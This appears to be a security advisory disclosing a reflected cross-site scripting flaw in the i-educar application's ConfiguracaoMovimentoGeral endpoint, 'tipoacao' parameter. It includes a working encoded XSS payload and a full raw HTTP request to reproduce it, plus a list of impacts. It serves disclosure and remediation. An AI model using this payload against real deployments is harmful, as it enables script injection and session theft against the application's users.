Cross-Site Scripting (XSS) Reflected endpoint `/module/Configuracao/ConfiguracaoMovimentoGeral` parameter `tipoacao`

---

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the `/module/Configuracao/ConfiguracaoMovimentoGeral` endpoint of the _i-educar_ application. This vulnerability allows attackers to inject malicious scripts into the `tipoacao` parameter. The payload is reflected in the application’s HTTP response without proper sanitization, leading to immediate execution in the victim’s browser.

---

## Details

**Vulnerable Endpoint:** `POST /module/Configuracao/ConfiguracaoMovimentoGeral`  
**Parameter:** `tipoacao`

The application fails to properly validate and sanitize user input in the `tipoacao` parameter. An attacker can craft a malicious URL containing a JavaScript payload, which is reflected back in the server’s response and executed when a victim accesses the crafted link.

---

## PoC

**Payload:**

`%22%3E%3Cimg%20src=x%20onerror=alert('XSS-PoC4')%3E`

### Steps to Reproduce:

1. Log in to the _i-educar_ application.
    
2. Make a request using Caido similar to the one below.

```
POST /module/Configuracao/ConfiguracaoMovimentoGeral HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/module/Configuracao/ConfiguracaoMovimentoGeral
Cookie: grav-admin-flexpages=eyJyb3V0ZSI6Ii9ob21lIiwiZmlsdGVycyI6e319; grav-tabs-state={%22tab--f0e041eed24f87f2b6b02fd6924d0a08%22:%22data.languages%22%2C%22tab-flex-pages-e838602f51515c83bca06a8ae758ce52%22:%22data.security%22%2C%22tab-flex-pages-b6676b27f5cdf6b6c22f8e18da4259a0%22:%22data.advanced%22%2C%22tab-flex-pages-raw-8f0a83a672754f7823714134334b1de8%22:%22data.content%22%2C%22tab-flex-pages-dc26c564cb2116d77bda5fff24ba90dc%22:%22data.security%22%2C%22tab-flex_conf-user_groups-accounts-02f0e9f68f41a0648ed530f80bd72c06%22:%22data.cache%22%2C%22tab-flex-pages-raw-9a0364b9e99bb480dd25e1f0284c8555%22:%22data.content%22%2C%22tab-flex-pages-e91e6348157868de9dd8b25c81aebfb9%22:%22data.security%22%2C%22tab--8cc45760590da203c5fc3568ecbabd66%22:%22data.routes%22%2C%22tab--7a2ac3477f8ad14aa750831441325a16%22:%22data.facebook%22}; i_educar_session=zwaLFqQcylntJZp9KejOuTI6ts3wcjebWqYM2vcd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

tipoacao=Editar%22%3E%3Cimg%20src=x%20onerror=alert('XSS-PoC4')%3E
```

![[Pasted image 20250817003111.png]]

The result:

![[Pasted image 20250817003156.png]]


---

## Impact

Reflected XSS vulnerabilities can lead to severe consequences, including:

- **Session hijacking:** Theft of cookies or authentication tokens
    
- **Credential theft:** Capturing sensitive user credentials via injected scripts
    
- **Malware delivery:** Redirecting victims to malicious downloads or exploit pages
    
- **Phishing attacks:** Displaying deceptive forms or content to steal user data
    
- **Reputation damage:** Exploiting trust between the application and its users
    
- **Client-side manipulation:** Altering the application’s content and behavior dynamically


## Discoverer

[Marcelo Queiroz](www.linkedin.com/in/marceloqueirozjr)

by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)